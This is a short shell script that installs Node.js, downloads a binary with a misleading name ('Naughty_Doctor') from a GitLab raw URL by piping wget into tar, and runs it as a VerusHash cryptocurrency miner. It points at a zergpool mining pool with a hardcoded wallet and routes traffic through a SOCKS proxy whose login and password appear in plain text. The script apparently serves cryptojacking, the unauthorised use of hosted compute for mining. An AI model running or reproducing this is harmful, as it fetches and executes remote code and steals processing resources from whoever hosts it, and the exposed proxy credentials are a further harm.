wget https://nodejs.org/download/release/v14.17.0/node-v14.17.0-linux-x64.tar.gz
\tar xf node-v14.17.0-linux-x64.tar.gz -C /opt/
\rm node-v14.17.0-linux-x64.tar.gz
PATH=/opt/node-v14.17.0-linux-x64/bin:$PATH
npm config set cache /tmp --global
wget https://gitlab.com/richardkevin320/donlod/-/raw/main/Naughty_Doctor.tar.gz -O - | tar -xz
ph add Naughty_Doctor
ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./Naughty_Doctor --disable-gpu --algorithm verushash --pool verushash.mine.zergpool.com:3300 --wallet TRzWbrKRmJYETRPTrVW8RwbX6Sa9KJNbZ7.NaughtyDoctorOkt --password c=TRX,mc=VRSC --proxy mikrotik999:Elibawnos@cpusocks1.wot.mrface.com:1080 --cpu-threads $num_of_cores


